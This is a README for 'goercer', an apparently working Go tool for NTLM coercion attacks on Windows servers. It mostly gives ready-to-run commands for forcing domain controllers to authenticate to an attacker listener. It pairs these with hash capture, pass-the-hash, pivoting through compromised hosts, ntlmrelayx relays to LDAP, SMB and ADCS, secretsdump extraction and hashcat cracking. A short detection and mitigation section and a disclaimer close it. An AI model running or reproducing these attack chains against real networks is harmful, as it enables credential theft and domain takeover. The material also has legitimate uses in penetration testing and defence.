# Goercer - NTLM Coercion Attack Tool

A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods, alternative named pipes, and **pass-the-hash authentication**.

## 🚀 Quick Start

```bash
# 1. Install
git clone https://github.com/YOUR_USERNAME/goercer.git
cd goercer
./build.sh

# 2. Start listener (Terminal 1)
sudo responder -I eth0 -v

# 3. Run attack (Terminal 2)
./goercer <target> <listener> <user> <pass> <domain>

# OR use NTLM hash (pass-the-hash)
./goercer <target> <listener> <user> <hash> <domain>

# 4. Capture hash in Responder
# [SMB] NTLMv2-SSP Hash: MACHINE$::DOMAIN:...
```

---

## 📊 Method Comparison

| Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
|--------|----------|--------------|-----------|---------------|----------------|
| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1 | ALL Windows servers | ✅ **Best first choice** |
| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Maximum callbacks** |
| **ShadowCoerce** | MS-FSRVP | ⭐⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
| **DFSCoerce** | MS-DFSNM | ⭐ | Varies | Requires DFS Namespaces | ⚠️ Rarely works |

**Recommendation**: Try **PetitPotam** first (works everywhere), then **SpoolSample** (3x callbacks) if Print Spooler is running.

---

## ✅ Status: **WORKING**

Successfully coerces Windows servers to authenticate to an attacker-controlled listener, capturing machine account NTLMv2 hashes.

**Key Features**:
- ✅ **Pass-the-Hash Support** - Authenticate with NTLM hash instead of password
- ✅ **SOCKS5 Proxy Support** - Route attacks through proxy servers
- ✅ **4 Coercion Methods** - PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce
- ✅ **Alternative Named Pipes** - 5 pipe options for PetitPotam (lsarpc, efsr, samr, netlogon, lsass)
- ✅ **PKT_PRIVACY Encryption** - Full DCERPC authentication with encryption/signing
- ✅ **Single Binary** - No dependencies, portable Go executable

**Supported Methods**:
- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback - Works on ALL Windows servers
- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running
- ⚠️ **ShadowCoerce** (MS-FSRVP) - Requires VSS service configured for RPC
- ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed

**Tested Against**: 
- Windows Server 2019 Domain Controller
- Windows Server 2016/2019/2022
- Windows 10/11 (with appropriate services)

**Authentication Methods**:
- ✅ Password authentication (plaintext)
- ✅ Pass-the-hash (NTLM hash - 32 hex characters)

**Result**: ✅ Machine account hashes captured via Responder

---

## Installation

```bash
git clone https://github.com/YOUR_USERNAME/goercer.git
cd goercer
./build.sh
```

The build script will automatically fetch the required `go-smb-coercer` fork with DCERPC pipe enhancements from https://github.com/ineffectivecoder/go-smb-coercer.

---

## Code Structure

**Single-File Design**: The entire implementation is in `goercer.go` (~1900 lines). This is an intentional design choice for:
- **Portability**: Easy to copy and deploy as a single file
- **Simplicity**: No complex package structure to navigate
- **Self-contained**: All coercion methods, auth code, and crypto in one place
- **Educational value**: Complete NTLM/DCERPC flow visible in sequence

The file is organized into logical sections:
1. **NTLM Authentication** (lines 551-1200): Full PKT_PRIVACY auth implementation
2. **Coercion Methods** (lines 241-550): PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce
3. **DCERPC Encoding** (lines 1201-1600): Request/response handling
4. **NDR Stub Builders** (lines 1601-1900): Method-specific parameter encoding
5. **Utilities** (lines 1901-1919): UUID parsing, string conversion

While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.), the single-file approach makes it easier to understand the complete attack flow and deploy to target environments.

---

## Usage

```bash
./goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]

# Show help
./goercer -h
./goercer --help
```

### Authentication

**Password Authentication**:
```bash
./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local
```

**Pass-the-Hash** (using NTLM hash):
```bash
# Extract hash from secretsdump, hashdump, or other tools
./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
```

The tool automatically detects if you're providing a password or NTLM hash (32 hex characters).

### SOCKS5 Proxy Support

**Validated and working** - The tool correctly routes connections through SOCKS5 proxies for network pivoting.

**Use proxy for pivoting**:
```bash
# Setup SOCKS5 proxy (via SSH tunnel or compromised host)
ssh -D 1080 user@pivot-host

# Route attack through proxy
./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local --proxy socks5://127.0.0.1:1080

# Works with all methods and authentication modes
./goercer 10.0.0.10 10.0.0.5 john hash corp.local spoolsample --proxy socks5://127.0.0.1:1080
./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local petitpotam efsr --proxy socks5://127.0.0.1:1080
```

**How it works**:
- Without `--proxy`: Connects directly to target IP
- With `--proxy`: Connects to proxy server, which then connects to target
- Verified with `strace`: Shows connection to proxy IP, not target IP

**Common proxy scenarios**:
- **SSH SOCKS tunnel**: `ssh -D 1080 user@jumpbox`
- **Metasploit SOCKS proxy**: Use `auxiliary/server/socks_proxy`
- **Chisel tunnel**: `chisel server -p 8080 --socks5` / `chisel client server:8080 socks`
- **Proxychains alternative**: Built-in, no external tool needed

### Help Output

```
Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]

Methods:
  petitpotam     - MS-EFSRPC coercion (default)
  spoolsample    - MS-RPRN print spooler coercion
  shadowcoerce   - MS-FSRVP volume shadow copy coercion
  dfscoerce      - MS-DFSNM DFS namespace coercion

Pipes (for petitpotam only):
  lsarpc (default), efsr, samr, netlogon, lsass

Examples:
  ./goercer <target> <listener> <user> <pass> <domain> petitpotam
  ./goercer <target> <listener> <user> 8846f7eaee8fb117ad06bdd830b7586c <domain> petitpotam
  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
  ./goercer <target> <listener> <user> <pass> <domain> spoolsample
```

### Quick Start

```bash
# Terminal 1: Start Responder
sudo responder -I eth0 -v

# Terminal 2: Run attacks

# PetitPotam with default pipe (lsarpc) - MOST RELIABLE
./goercer <target> <listener> <user> <pass> <domain>

# PetitPotam with pass-the-hash
./goercer <target> <listener> <user> 1a2803ab98942ee503680dd3de3cceb2 <domain>

# PetitPotam with alternative pipe
./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr

# SpoolSample - HIGH SUCCESS RATE (3 callbacks)
./goercer <target> <listener> <user> <pass> <domain> spoolsample

# Use SOCKS5 proxy (pivoting through compromised host)
./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080

# ShadowCoerce (only if VSS RPC is available)
./goercer <target> <listener> <user> <pass> <domain> shadowcoerce

# DFSCoerce (only if DFS Namespaces role installed)
./goercer <target> <listener> <user> <pass> <domain> dfscoerce
```

---

## Attack Methods

### PetitPotam (MS-EFSRPC) ✅ Most Reliable

- **Default Pipe**: `\pipe\lsarpc`
- **Alternative Pipes**: `\pipe\efsr`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass`
- **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
- **Opnums**: 
  - 0 (EfsRpcOpenFileRaw - often patched)
  - 4 (EfsRpcEncryptFileSrv - working)
- **Callbacks**: 1 authentication attempt
- **Target Parameter**: UNC path in MS-EFSRPC function calls
- **Compatibility**: Works on **ALL Windows servers** (core service)
- **Discovery**: @topotam77

**Why it works**: LSARPC is a core Windows service present on every Windows system. The alternative pipes provide additional attack surface if lsarpc is somehow blocked.

### SpoolSample (MS-RPRN) ✅ High Success Rate

- **Pipe**: `\pipe\spoolss`
- **UUID**: `12345678-1234-abcd-ef00-0123456789ab` v1.0
- **Opnums**: 
  - 1 (RpcOpenPrinter - opens printer handle)
  - 65 (RpcRemoteFindFirstPrinterChangeNotificationEx)
  - 62 (RpcRemoteFindFirstPrinterChangeNotification)
- **Callbacks**: **3 authentication attempts** (maximum coercion!)
- **Target Parameter**: `pszLocalMachine` in notification functions
- **Compatibility**: Works when Print Spooler service is running (**default on most servers**)
- **Discovery**: @tifkin_ & @elad_shamir

**Why 3 callbacks**: Windows makes separate authentication attempts when opening the printer handle and when each notification function tries to contact the remote machine.

### ShadowCoerce (MS-FSRVP) ⚠️ Situational

- **Pipe**: `\pipe\FssagentRpc`
- **UUID**: `a8e0653c-2744-4389-a61d-7373df8b2292` v1.0
- **Opnums**: 
  - 8 (IsPathSupported)
  - 9 (IsPathShadowed)
- **Callbacks**: Varies
- **Target Parameter**: ShareName in VSS function calls
- **Compatibility**: Requires **Volume Shadow Copy Service (VSS) configured for RPC access**
- **Limitation**: Only works when VSS is properly configured - **not default on most servers**

**Common failure**: `failed to open pipe FssagentRpc: Requested file does not exist`

### DFSCoerce (MS-DFSNM) ⚠️ Requires DFS Role

- **Pipe**: `\pipe\netdfs`
- **UUID**: `4fc742e0-4a10-11cf-8273-00aa004ae673` v3.0
- **Opnums**: 
  - 12 (NetrDfsAddStdRoot)
  - 13 (NetrDfsRemoveStdRoot)
- **Callbacks**: Varies
- **Target Parameter**: ServerName in DFS function calls
- **Compatibility**: Only works when **DFS Namespaces role is installed AND configured**
- **Limitation**: **Rare** - most servers don't have DFS Namespaces configured
- **Discovery**: @filip_dragovic

**Common failures**: 
- `failed to open pipe netdfs: Requested file does not exist` - DFS not installed
- `bind rejected (BindNak)` - DFS exists but doesn't accept authenticated RPC

**Recommendation**: Use **PetitPotam** or **SpoolSample** for maximum compatibility. ShadowCoerce and DFSCoerce are situational and depend on optional Windows features.

---

## 🎯 Use Cases

### 1. Hash Capture for Offline Cracking
```bash
# Capture machine account hash
sudo responder -I eth0 -v
./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample

# Responder captures: MACHINE$::DOMAIN:<hash>
# Crack with hashcat: hashcat -m 5600 hash.txt wordlist.txt
```

**Pro Tip**: If you've already compromised a user via other means (password spray, phishing, etc.), you can use pass-the-hash for the initial authentication to goercer:
```bash
# Extract user hash from secretsdump
secretsdump.py 'DOMAIN/user:password@<DC>'

# Use that hash to authenticate for coercion
./goercer <DC> <attacker_IP> user 8846f7eaee8fb117ad06bdd830b7586c DOMAIN spoolsample
```

### 2. NTLM Relay to LDAP (Privilege Escalation)
```bash
# Relay to LDAP for DCSync rights
ntlmrelayx.py -t ldaps://<DC> --delegate-access
./goercer <DC> <attacker_IP> <user> <pass> <domain> petitpotam

# Result: Machine account gets delegation rights
```

### 3. NTLM Relay to SMB (Admin Access)
```bash
# Relay to another server
ntlmrelayx.py -t smb://<target_server> -smb2support
./goercer <source_server> <attacker_IP> <user> <pass> <domain> petitpotam

# Result: Admin access if target server allows relaying
```

### 4. ADCS Certificate Attack (ESC8)
```bash
# Relay to ADCS web enrollment
ntlmrelayx.py -t http://<ADCS>/certsrv/certfnsh.asp --adcs --template Machine
./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample

# Result: Obtain machine certificate for impersonation
```

---

## 🔧 Troubleshooting

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| `Pipe not found` | Service not available | Try PetitPotam (always works) or SpoolSample |
| `ACCESS_DENIED` | Opnum patched | Tool tries alternate opnums automatically |
| `Bind rejected (BindNak)` | Service doesn't accept PKT_PRIVACY | Normal for DFS/VSS - use PetitPotam instead |
| No callback in Responder | Network/firewall issue | Check connectivity, firewall rules, listener IP |
| `ERROR_BAD_NETPATH` | Coercion succeeded! | This is success - check Responder for hash |
| Opnum 0 success (PetitPotam) | Likely patched | Opnum 0 often returns success when patched - verify callback |

### Verification Steps

1. **Check SMB connectivity**:
   ```bash
   smbclient -L //<target> -U <domain>/<user>
   ```

2. **Verify Responder is listening**:
   ```bash
   sudo netstat -tulpn | grep :445
   ```

3. **Test with Coercer (Python) for comparison**:
   ```bash
   Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name lsarpc
   ```

4. **Check Print Spooler status** (for SpoolSample):
   ```bash
   rpcdump.py <target> | grep spoolsss
   ```

---

## 📚 Technical Implementation

### Extensible Architecture

The codebase uses a `CoercionMethod` struct pattern for easy addition of new methods:

```go
type CoercionMethod struct {
    Name         string
    PipeName     string
    UUID         string
    MajorVersion uint16
    MinorVersion uint16
    Opnums       []uint16
    CreateStub   func(string, []byte) []byte
}
```

**Adding new methods** requires:
1. Define new CoercionMethod with pipe, UUID, opnums
2. Implement stub builder function with proper NDR encoding
3. Create execute function following PetitPotam/SpoolSample pattern
4. Add switch case in main()

### Implementation Flow

1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
   - Connect to `\\target\IPC$`
   - NTLM authentication at SMB layer
   - Open named pipe based on method

2. **DCERPC Bind**
   - Method-specific UUID and version
   - Authentication: NTLM with PKT_PRIVACY (level 6)
   - 3-way handshake: Bind → BindAck → Auth3

3. **NTLM Authentication**
   - **Type 1 (Negotiate)**: Send with NTLMv2-required flags
   - **Type 2 (Challenge)**: Receive from server, extract targetInfo
   - **Type 3 (Authenticate)**: Build NTLMv2 response with:
     - NTLMv2 hash: `HMAC-MD5(NT hash, uppercase(user) + domain)`
     - Client challenge (8 random bytes)
     - Timestamp (Windows FILETIME format)
     - targetInfo from Challenge + TARGET_NAME AV_PAIR
     - MIC (Message Integrity Check)

4. **DCERPC Encryption (PKT_PRIVACY)**
   - Session key derivation with KEY_EXCH
   - Client keys: `MD5(sessionKey + "...client-to-server...magic constant\x00")`
   - Server keys: `MD5(sessionKey + "...server-to-client...magic constant\x00")`
   - **Critical**: RC4 cipher is continuous stream (never reset between messages)
   - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)
   - **Response decryption**: Extract encrypted stub, decrypt with server RC4 handle

5. **Coercion Execution**
   - Call RPC functions with listener UNC paths
   - Server attempts to access UNC path, triggering NTLM authentication
   - Responder captures machine account NTLMv2 hash

### Why PKT_PRIVACY (Level 6)?

Most coercion implementations use unauthenticated DCERPC. This implementation uses **PKT_PRIVACY** for:

- Understanding full DCERPC authentication mechanics
- Learning NTLM encryption/signing implementation
- Demonstrating encryption doesn't prevent coercion
- Bypassing potential security products that block unauthenticated RPC
- Educational value for penetration testers

### Critical NDR Encoding: SpoolSample

SpoolSample required solving **NDR (Network Data Representation) encoding** for RpcOpenPrinter:

**The Problem**: `pPrinterName` is `STRING_HANDLE` which equals `LPWSTR` (unique pointer in NDR).

**NDR Rule**: All unique pointers require a 4-byte **referent ID** before the pointed-to data.

**The Fix**:
```go
// Correct - referent ID first
binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
binary.Write(&buf, binary.LittleEndian, lenChars)  // Then conformant varying string
```

Without the referent ID: `ERROR_BAD_NETPATH (0x6f7)`  
With the referent ID: Success, returns 20-byte `PRINTER_HANDLE`

### Response Decryption (PKT_PRIVACY)

Server responses in PKT_PRIVACY mode are encrypted and require decryption:

```go
// Server keys calculated with mode='Server'
auth.serverSignKey = calculateSignKey(exportedSessionKey, false)
auth.serverSealKey = calculateSealKey(exportedSessionKey, false)
auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)

// Decryption process
authTrailerStart := fragLen - authLen - 8
encryptedStub := response[24:authTrailerStart] // Between header and trailer
auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
```

**Structure**: DCERPC header (24) + encrypted stub + padding + auth trailer (8 + authLen)

**Note**: Fault responses have `authLen=0` (unencrypted)

---

## Common Errors and Solutions

### PetitPotam Errors

1. **ACCESS_DENIED (0x00000005)**
   - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
   - **Fix**: Ensure both flags are set in Negotiate message

2. **Encryption mismatch / Decryption failures**
   - **Cause**: RC4 cipher being reset between requests
   - **Fix**: Use single continuous RC4 cipher handle

3. **Wrong pipe/UUID**
   - **Cause**: Using `\pipe\efsrpc` with wrong UUID
   - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`

### SpoolSample Errors

4. **ERROR_BAD_NETPATH in RpcOpenPrinter (0x6f7)**
   - **Cause**: Missing NDR referent ID for unique pointer
   - **Fix**: Add `0x00020000` referent ID before `pPrinterName` string

### ShadowCoerce Errors

5. **Pipe FssagentRpc not found**
   - **Cause**: VSS service not configured for RPC access
   - **Status**: Normal - VSS RPC is not enabled by default
   - **Solution**: Use PetitPotam or SpoolSample instead

### DFSCoerce Errors

6. **Pipe netdfs not found**
   - **Cause**: DFS Namespaces role not installed
   - **Status**: Normal - DFS Namespaces is optional
   - **Solution**: Use PetitPotam or SpoolSample instead

7. **Bind rejected (BindNak)**
   - **Cause**: DFS exists but doesn't accept PKT_PRIVACY authentication
   - **Status**: Some DFS versions don't support authenticated RPC
   - **Solution**: Use PetitPotam or SpoolSample instead

---

## Testing

### Basic Test Flow

```bash
# Terminal 1: Responder
sudo responder -I eth0 -v

# Terminal 2: Build
./build.sh

# Test PetitPotam (works on all servers)
./goercer <target> <listener> <user> <pass> <domain> petitpotam
# Expected: 1 callback in Responder

# Test PetitPotam with alternative pipe
./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
# Expected: 1 callback in Responder

# Test SpoolSample (works when Print Spooler running)
./goercer <target> <listener> <user> <pass> <domain> spoolsample
# Expected: 3 callbacks in Responder

# Test ShadowCoerce (only if VSS configured)
./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
# Expected: Callback if VSS available, otherwise pipe not found error

# Test DFSCoerce (only if DFS Namespaces role installed)
./goercer <target> <listener> <user> <pass> <domain> dfscoerce
# Expected: Callback if DFS configured, otherwise pipe not found or bind rejected
```

### Expected Responder Output

```
[SMB] NTLMv2-SSP Client   : <target_ip>
[SMB] NTLMv2-SSP Username : <domain>\MACHINE$
[SMB] NTLMv2-SSP Hash     : MACHINE$::<domain>:<challenge>:<hash>:...
```

### Verify with Coercer

```bash
cd Coercer

# Test PetitPotam
./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name lsarpc

# Test SpoolSample
./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name spoolss

# Should get same callback counts as goercer
```

---

## Complete Working Solution Summary

After extensive debugging and analysis comparing with Python impacket and Coercer, the following critical fixes were required:

### Critical Fixes

1. **Type 1 Flags** ⚠️ MOST CRITICAL (PetitPotam)
   - **Problem**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` (0x00800000) and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` (0x00080000)
   - **Impact**: Windows rejected authentication with ACCESS_DENIED before attempting coercion
   - **Fix**: Add both flags to Type 1 Negotiate message
   - **Lesson**: These flags signal NTLMv2 intent to server - without them, server rejects at NTLM layer

2. **Pipe and UUID** (PetitPotam)
   - **Problem**: Using `\pipe\efsrpc` with UUID `df1941c5-fe89-4e79-bf10-463657acf44d`
   - **Impact**: Wrong interface binding
   - **Fix**: Use `\pipe\lsarpc` with UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
   - **Lesson**: Python PetitPotam uses lsarpc despite calling MS-EFSRPC functions

3. **NTLMv2 Identity Calculation**
   - **Problem**: Uppercasing both username AND domain: `uppercase(user + domain)`
   - **Impact**: Wrong NTLMv2 hash, authentication failure
   - **Fix**: Only uppercase username: `uppercase(user) + domain`
   - **Lesson**: MS-NLMP spec and impacket only uppercase the user component

4. **RC4 Cipher Continuity**
   - **Problem**: Creating new RC4 cipher for each request
   - **Impact**: Encryption keystream out of sync, decryption failures
   - **Fix**: Initialize RC4 once, reuse same cipher handle for all operations
   - **Lesson**: RC4 is a stream cipher - state must persist across all encryptions

5. **Encryption Order**
   - **Problem**: Signing before encrypting, or encrypting then signing separately
   - **Impact**: RC4 keystream bytes consumed in wrong order
   - **Fix**: Encrypt stub first, THEN sign (signature encrypts checksum with continued stream)
   - **Lesson**: impacket's SEAL function shows exact order - stub uses bytes 0..N, checksum uses N+1..N+8

6. **NDR Referent ID** ⚠️ CRITICAL FOR SPOOLSAMPLE
   - **Problem**: Missing 4-byte referent ID for unique pointer in RpcOpenPrinter
   - **Impact**: ERROR_BAD_NETPATH (0x6f7), RpcOpenPrinter failed
   - **Fix**: Add referent ID `0x00020000` before `pPrinterName` string
   - **Lesson**: `STRING_HANDLE = LPWSTR = unique pointer` in NDR requires referent ID before data

7. **Server-Side Crypto Keys** (Response Decryption)
   - **Problem**: Only had client keys, couldn't decrypt server responses
   - **Impact**: Could send encrypted requests but not decrypt responses
   - **Fix**: Calculate server keys with `mode='Server'` (false parameter), add serverSealHandle
   - **Lesson**: PKT_PRIVACY requires both directions - client keys for requests, server keys for responses

---

## Dependencies: go-smb-coercer

This project uses a customized fork of the go-smb library with specialized DCERPC/named pipe enhancements.

### What is go-smb-coercer?

**GitHub Repository**: https://github.com/ineffectivecoder/go-smb-coercer

This fork contains v0.6.7 of `github.com/jfjallid/go-smb` with **5 additional methods** for DCERPC named pipe communication. The fork extends the upstream library with specialized enhancements for coercion attacks.

### Why it exists

The upstream go-smb library focuses on high-level SMB file operations and lacks low-level named pipe primitives needed for DCERPC. This implementation requires fine-grained control over:

- Message-oriented pipe operations (named pipes use offset=0, not file positions)
- Fire-and-forget writes (Auth3 packets don't expect responses)
- Pipe-specific error handling (EOF, broken pipe, disconnected states)

### Modifications (5 new methods added to upstream)

**In `smb/connection.go`:**

- `sendNoWait()` - Fire-and-forget send operation. Waits for SMB ack but doesn't return DCERPC response. Used for Auth3 packets (2-second timeout).

**In `smb/session.go` (on File struct):**

- `WritePipe(data)` - Write to named pipe with SMB Write Response handling. Always uses offset=0 (pipes are message-oriented).
- `ReadPipe(b)` - Read from named pipe with pipe-specific error handling. Handles EOF, broken pipe, and disconnected states.
- `WriteFileNoRecv(data, offset)` - Write without waiting for response. Also fire-and-forget for Auth3.

**In `smb/session.go` (on Connection struct):**

- `WriteIoCtlReqNoWait(req)` - IOCTL request without response. Wrapper around `sendNoWait()`.

### Code Layout

**go-smb-coercer** (GitHub fork):
```
smb/
├── connection.go          (+ sendNoWait method)
├── session.go             (+ WritePipe, ReadPipe, WriteFileNoRecv, WriteIoCtlReqNoWait)
└── dcerpc/                (unchanged - library's DCERPC functions)
```

**goercer** (main project):
```
goercer.go                 Main implementation with all coercion methods
build.sh                   Build script
go.mod                     Module with replace directive for go-smb-coercer fork
README.md                  This file
```

### Usage in goercer

The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communication. Without these methods, the code would need to use low-level IOCTL calls directly, making it significantly more verbose and less maintainable.

---

## ❓ FAQ

**Q: Which method should I use first?**  
A: **PetitPotam** (default). It works on all Windows servers. If you want maximum callbacks, use **SpoolSample** (3 callbacks).

**Q: What does ERROR_BAD_NETPATH mean?**  
A: **Success!** This indicates the server tried to access your UNC path. Check Responder for the captured hash.

**Q: Why no callback in Responder?**  
A: Common causes:
- Firewall blocking SMB (port 445)
- Listener IP unreachable from target
- Responder not running or wrong interface
- Network segmentation (target can't route to listener)

**Q: Can I use this against domain controllers?**  
A: Yes! PetitPotam and SpoolSample both work well against DCs. This is often used to capture DC machine account hashes.

**Q: Can I use pass-the-hash?**  
A: Yes! Provide the NTLM hash (32 hex characters) instead of the password:
```bash
./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
```
The tool automatically detects if you're using a hash or password. Common sources for NTLM hashes:
- `secretsdump.py` - Dump from domain controller or SAM
- `hashdump` / `mimikatz` - Extract from compromised systems
- Password cracking tools output
- Previous Responder/ntlmrelayx captures

**Q: What's the difference between PetitPotam pipes?**  
A: All pipes use the same MS-EFSRPC protocol but different named pipe endpoints:
- `lsarpc` (default): Most reliable, always available
- `efsr`, `samr`, `netlogon`, `lsass`: Alternative endpoints if lsarpc is blocked

**Q: Why does Opnum 0 succeed but no callback?**  
A: Opnum 0 (EfsRpcOpenFileRaw) is often patched to return success without performing UNC access. The tool automatically tries Opnum 4 (EfsRpcEncryptFileSrv) which usually works.

**Q: How is this different from Coercer?**  
A: 
- **goercer**: Go implementation with PKT_PRIVACY encryption, single binary, portable
- **Coercer**: Python tool with many methods, requires Python dependencies
- Both achieve the same goal; goercer focuses on the most reliable methods

**Q: Can I relay instead of capturing hashes?**  
A: Yes! Use `ntlmrelayx.py` instead of Responder:
```bash
ntlmrelayx.py -t ldaps://<target> --delegate-access
./goercer <source> <attacker_IP> <user> <pass> <domain>
```

**Q: Can I use this through a proxy?**  
A: Yes! Use the `--proxy` flag for SOCKS5 proxies:
```bash
# SSH tunnel
ssh -D 1080 user@pivot
./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080

# Chisel
chisel server -p 8080 --socks5
./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
```
This is useful for pivoting through compromised hosts or accessing segmented networks.

**Q: Does this work on Windows 11/Server 2022?**  
A: Yes! PetitPotam and SpoolSample still work on latest Windows versions. Microsoft's patches focused on unauthenticated coercion; authenticated attacks still function.

**Q: What credentials do I need?**  
A: Any valid domain account credentials. The attack authenticates legitimately, then triggers coercion through valid RPC calls.

**Q: Why use PKT_PRIVACY instead of unauthenticated RPC?**  
A: 
- Educational value (complete NTLM/DCERPC implementation)
- Bypasses security products that block unauthenticated RPC
- More realistic attack scenario (authenticated access is common)
- Demonstrates that encryption doesn't prevent coercion

---

## 🛡️ Detection & Defense

### Detection Strategies

**Network-Level**:
- Monitor for SMB connections to unusual IPs (especially from DCs/servers to workstations)
- Alert on excessive DCERPC pipe opens (lsarpc, spoolss, eventlog)
- Detect UNC path access to unknown/external IPs

**Event Logs**:
- Event ID 5145: Network share accessed (look for \\??\\UNC\\ paths)
- Event ID 4624: Logon events from service accounts to unexpected systems
- Print Spooler events with external printer connections

**Endpoint Detection**:
- Monitor `lsass.exe` network connections to workstations
- Alert on Print Spooler (`spoolsv.exe`) making outbound SMB connections
- Detect EFSRPC calls with UNC paths

### Mitigation Strategies

1. **Disable Print Spooler** (prevents SpoolSample):
   ```powershell
   Stop-Service Spooler
   Set-Service Spooler -StartupType Disabled
   ```

2. **Apply MS Patches**:
   - KB5005413 (PetitPotam patch for unauthenticated access)
   - Note: Authenticated PetitPotam still works post-patch

3. **Network Segmentation**:
   - Prevent servers from initiating SMB to workstation subnets
   - Block outbound SMB (445) from DCs except to trusted systems

4. **SMB Signing**:
   - Enable SMB signing requirement (prevents NTLM relay)
   - Configure via GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network client/server: Digitally sign communications (always)"

5. **Disable NTLM** (if feasible):
   - Enforce Kerberos-only authentication
   - Configure via GPO: Network security: Restrict NTLM

6. **Monitor LSARPC Access**:
   - Enable audit for pipe access
   - Alert on unusual RPC method calls

### Is This Vulnerability Patchable?

**Short answer**: Not fully.

PetitPotam and SpoolSample exploit **legitimate protocol functionality**. As long as Windows servers need EFSRPC and Print Spooler services, these coercion methods remain viable when used with **valid credentials**.

Microsoft's patches only addressed **unauthenticated** access. Authenticated coercion (what goercer does) is considered intended functionality.

---

## References

- **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
- **MS-RPRN**: Print System Remote Protocol
- **MS-FSRVP**: File Server Remote VSS Protocol
- **MS-DFSNM**: Distributed File System (DFS): Namespace Management Protocol
- **MS-RPCE**: Remote Procedure Call Protocol Extensions  
- **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
- **PetitPotam**: Original PoC by @topotam77
- **SpoolSample/PrinterBug**: @tifkin_ & @elad_shamir
- **ShadowCoerce**: Volume Shadow Copy coercion
- **DFSCoerce**: DFS namespace coercion by @filip_dragovic
- **impacket**: Python implementation reference
- **Coercer**: Multi-method coercion tool by @p0dalirius

---

## Credits

- **@topotam77**: Original PetitPotam discovery and PoC
- **@p0dalirius**: Coercer multi-method implementation and validation
- **Lee Christensen (@tifkin_)**: SpoolSample/PrinterBug discovery
- **@elad_shamir**: SpoolSample research
- **@filip_dragovic**: DFSCoerce discovery
- **impacket team**: Reference NTLM/DCERPC implementation
- **go-smb** (jfjallid): Go SMB client library [go-smb](https://github.com/jfjallid/go-smb)
- **Microsoft**: Protocol specifications

---

## ⚖️ Legal Disclaimer

This tool is for **educational and authorized security testing purposes only**. 

**You must**:
- ✅ Have explicit written permission before testing
- ✅ Use only in authorized penetration testing engagements
- ✅ Comply with all applicable laws and regulations
- ✅ Respect scope boundaries in security assessments

**Unauthorized use is illegal**. The authors assume no liability for misuse or damages arising from the use of this tool.

By using goercer, you acknowledge that you have proper authorization and accept full responsibility for your actions.
